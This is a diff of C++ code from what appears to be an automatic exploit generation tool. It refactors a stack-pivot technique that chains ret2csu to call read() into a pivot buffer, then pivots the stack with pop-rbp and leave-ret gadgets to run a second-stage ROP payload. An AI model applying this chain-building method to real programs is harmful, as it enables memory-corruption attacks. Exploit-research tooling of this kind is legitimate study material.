@@ -62,17 +62,23 @@ std::vector<SymbolicRopPayload> BasicStackPivot::getSymbolicRopPayloadList() con
     Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
     assert(ret2csu);
 
-    uint64_t addr = m_ctx.getExploit().getElf().symbols()["read"];
-    uint64_t arg1 = 0;
-    uint64_t arg2 = m_ctx.getExploit().getSymbolValue("pivot_dest");
-    uint64_t arg3 = 1024;
-
+    // RBP
     SymbolicRopPayload part1 = { ConstantExpr::create(0, Expr::Int64) };
-    SymbolicRopPayload part2 = ret2csu->getSymbolicRopPayloadList(addr, arg1, arg2, arg3)[0];
+
+    // Write the 2nd stage ROP payload via read() to `pivot_dest`
+    // via ret2csu(read, 0, pivot_dest, 1024).
+    SymbolicRopPayload part2 = ret2csu->getSymbolicRopPayloadList(
+        BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
+        ConstantExpr::create(0, Expr::Int64),
+        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
+        ConstantExpr::create(1024, Expr::Int64)
+    )[0];
+
+    // Perform stack pivoting.
     SymbolicRopPayload part3 = {
-        BaseOffsetExpr::create(m_ctx.getExploit(), "pop_rbp_ret"),
-        BaseOffsetExpr::create(m_ctx.getExploit(), "pivot_dest"),
-        BaseOffsetExpr::create(m_ctx.getExploit(), "leave_ret"),
+        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pop_rbp_ret"),
+        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
+        BaseOffsetExpr::create(m_ctx.getExploit(), "", "leave_ret"),
     };
 
     SymbolicRopPayload ret;
